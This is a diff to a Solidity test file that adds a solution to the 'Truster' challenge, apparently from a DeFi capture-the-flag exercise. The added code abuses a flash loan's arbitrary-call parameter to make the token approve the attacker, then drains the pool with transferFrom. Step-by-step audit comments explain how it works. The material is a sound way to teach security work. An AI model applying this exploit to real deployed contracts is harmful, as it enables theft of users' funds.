@@ -41,7 +41,25 @@ contract Truster is DSTest {
 
     function testExploit() public {
         /** EXPLOIT START **/
-
+        //@audit-issue an approve function can be passed into the callData param
+        //@audit-issue We will use this amount in our allowance call
+        //@audit-issue next, call the flashloan using the allowance payload
+        //@audit-issue finally, call transferFrom using the trusterLenderPool addr and transfer poolBalance to attacker.
+        uint256 poolBalance = dvt.balanceOf(address(trusterLenderPool));
+        vm.prank(attacker);
+        bytes memory approvalCallData = abi.encodeWithSignature(
+            "approve(address,uint256)",
+            attacker,
+            poolBalance
+        );
+        trusterLenderPool.flashLoan(
+            0,
+            attacker,
+            address(dvt),
+            approvalCallData
+        );
+        vm.prank(attacker);
+        dvt.transferFrom(address(trusterLenderPool), attacker, poolBalance);
         /** EXPLOIT END **/
         validation();
     }
